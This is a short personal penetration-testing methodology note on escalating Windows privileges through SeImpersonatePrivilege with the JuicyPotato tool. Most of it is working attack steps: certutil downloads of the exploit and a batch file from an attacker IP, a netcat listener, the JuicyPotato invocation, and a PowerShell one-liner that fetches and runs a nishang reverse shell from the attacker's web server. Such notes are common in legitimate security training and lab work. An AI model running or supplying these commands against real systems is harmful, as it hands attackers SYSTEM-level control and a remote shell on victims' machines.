With this privilege we should try this attack: (Keep in mind machine architecture)
## JuicyPotato:
<https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505>
Useful reference video of attack: <https://youtu.be/dXotJLV6jj4?t=1848>

I saw I was part of the SeImpersonatePrivilege group so I instantly think of the juicypotato attack.

JuicyPotato.exe:
<https://github.com/ohpe/juicy-potato/releases>
Run systeminfo on box and then find the proper CLSID from here: 
<https://github.com/ohpe/juicy-potato/tree/master/CLSID/>

.\JuicyPotato.exe -t * -l 1337 -p "powershell.exe -e JABjetc"
<https://www.revshells.com/>

gedit shell.bat

gedit rev3.ps1
(contains nishang script)

certutil -urlcache -split -f <http://192.168.119.194/JuicyPotato.exe>
certutil -urlcache -split -f <http://192.168.119.194/shell.bat>

rlwrap nc -lvnp 444

.\JuicyPotato.exe -t * -p shell.bat -l 1337 

In this case we're using JuicyPotato to run shell.bat which contains a powershell script which reaches and runs a nishang reverse shell on our webserver.

Here's the shell.bat basic script:
powershell -c IEX(New-Object Net.WebClient).downloadString('<http://192.168.119.194/rev3.ps1')>

![unnamed_f436c126a7ed49bcae6bdfbb635d8ae7](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Privileges%20&%20groups/SeImpersonatePrivilege/JuicyPotato/{{notename}}-202605011506.png)
![unnamed_4fc10742bcf24d7b8ed3437f2178102b](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Privileges%20&%20groups/SeImpersonatePrivilege/JuicyPotato/{{notename}}-202605011506-1.png)
![unnamed_afda5d48d73b42098a852a6586809cc7](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Privileges%20&%20groups/SeImpersonatePrivilege/JuicyPotato/{{notename}}-202605011506-2.png)